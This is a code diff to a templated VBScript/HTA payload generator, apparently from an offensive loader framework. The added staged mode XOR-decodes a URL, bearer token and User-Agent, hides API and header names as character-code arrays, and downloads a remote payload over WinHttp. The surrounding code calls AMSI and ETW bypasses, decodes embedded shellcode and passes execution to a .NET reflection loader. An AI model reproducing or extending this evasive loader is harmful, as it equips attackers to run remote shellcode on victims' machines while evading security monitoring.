@@ -172,6 +172,37 @@ Sub {{ v.sub_run }}()
     Call {{ v.fn_amsi }}()
     Call {{ v.fn_etw }}()
 
+    {% if is_staged %}
+    ' Staged: XOR-decode URL/JWT/UA, fetch via WinHttp with Bearer auth.
+    Dim {{ sg.sg_lv_url }}, {{ sg.sg_lv_jwt }}, {{ sg.sg_lv_ua }}, {{ sg.sg_lv_i }}
+    Dim {{ sg.sg_lv_url }}_a, {{ sg.sg_lv_jwt }}_a, {{ sg.sg_lv_ua }}_a
+    {{ sg.sg_lv_url }}_a = Array({% for b in staged_url_enc %}{{ b }}{% if not loop.last %},{% endif %}{% endfor %})
+    {{ sg.sg_lv_jwt }}_a = Array({% for b in staged_jwt_enc %}{{ b }}{% if not loop.last %},{% endif %}{% endfor %})
+    {{ sg.sg_lv_ua }}_a  = Array({% for b in staged_ua_enc %}{{ b }}{% if not loop.last %},{% endif %}{% endfor %})
+    For {{ sg.sg_lv_i }} = 0 To UBound({{ sg.sg_lv_url }}_a): {{ sg.sg_lv_url }}_a({{ sg.sg_lv_i }}) = {{ sg.sg_lv_url }}_a({{ sg.sg_lv_i }}) Xor {{ staged_url_xk }}: Next
+    For {{ sg.sg_lv_i }} = 0 To UBound({{ sg.sg_lv_jwt }}_a): {{ sg.sg_lv_jwt }}_a({{ sg.sg_lv_i }}) = {{ sg.sg_lv_jwt }}_a({{ sg.sg_lv_i }}) Xor {{ staged_jwt_xk }}: Next
+    For {{ sg.sg_lv_i }} = 0 To UBound({{ sg.sg_lv_ua }}_a):  {{ sg.sg_lv_ua }}_a({{ sg.sg_lv_i }})  = {{ sg.sg_lv_ua }}_a({{ sg.sg_lv_i }})  Xor {{ staged_ua_xk }}:  Next
+    {{ sg.sg_lv_url }} = {{ v.fn_build_str }}({{ sg.sg_lv_url }}_a)
+    {{ sg.sg_lv_jwt }} = {{ v.fn_build_str }}({{ sg.sg_lv_jwt }}_a)
+    {{ sg.sg_lv_ua }}  = {{ v.fn_build_str }}({{ sg.sg_lv_ua }}_a)
+    Dim {{ sg.sg_lv_req }}
+    On Error Resume Next
+    Set {{ sg.sg_lv_req }} = CreateObject({{ v.fn_build_str }}(Array(87,105,110,72,116,116,112,46,87,105,110,72,116,116,112,82,101,113,117,101,115,116,46,53,46,49)))
+    If Err.Number <> 0 Then Err.Clear: Exit Sub
+    On Error GoTo 0
+    {{ sg.sg_lv_req }}.Open {{ v.fn_build_str }}(Array(71,69,84)), {{ sg.sg_lv_url }}, False
+    {{ sg.sg_lv_req }}.SetRequestHeader {{ v.fn_build_str }}(Array(65,117,116,104,111,114,105,122,97,116,105,111,110)), {{ v.fn_build_str }}(Array(66,101,97,114,101,114,32)) & {{ sg.sg_lv_jwt }}
+    {{ sg.sg_lv_req }}.SetRequestHeader {{ v.fn_build_str }}(Array(85,115,101,114,45,65,103,101,110,116)), {{ sg.sg_lv_ua }}
+    On Error Resume Next
+    {{ sg.sg_lv_req }}.Send
+    If Err.Number <> 0 Then Err.Clear: Exit Sub
+    On Error GoTo 0
+    If {{ sg.sg_lv_req }}.Status <> 200 Then Exit Sub
+    Dim {{ v.hta_lv_sc }}
+    {{ v.hta_lv_sc }} = {{ sg.sg_lv_req }}.responseBody
+    ' Zero out JWT in memory
+    For {{ sg.sg_lv_i }} = 0 To UBound({{ sg.sg_lv_jwt }}_a): {{ sg.sg_lv_jwt }}_a({{ sg.sg_lv_i }}) = 0: Next
+    {% else %}
     Dim {{ v.hta_lv_schex }}, {{ v.hta_lv_keyhex }}
     {{ v.hta_lv_schex }}  = {% for chunk in shellcode_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
     {{ v.hta_lv_keyhex }} = {% for chunk in key_chunks %}"{{ chunk }}"{% if not loop.last %} & {% endif %}{% endfor %}
@@ -187,6 +218,7 @@ Sub {{ v.sub_run }}()
         {{ v.hta_lv_sc }}({{ v.hta_lv_lcnt }}) = CInt("&H" & Mid({{ v.hta_lv_schex }}, {{ v.hta_lv_lcnt }} * 2 + 1, 2)) Xor _
                 {{ v.hta_lv_k }}({{ v.hta_lv_lcnt }} Mod (UBound({{ v.hta_lv_k }}) + 1))
     Next
+    {% endif %}
 
     Dim {{ v.hta_lv_loader }}: Set {{ v.hta_lv_loader }} = CreateObject({{ v.fn_build_str }}(Array({{ v.jsc_sys_refl_asm }})))
     Dim {{ v.hta_lv_stubhex }}: {{ v.hta_lv_stubhex }} = "{{ dotnet_stub_hex }}"
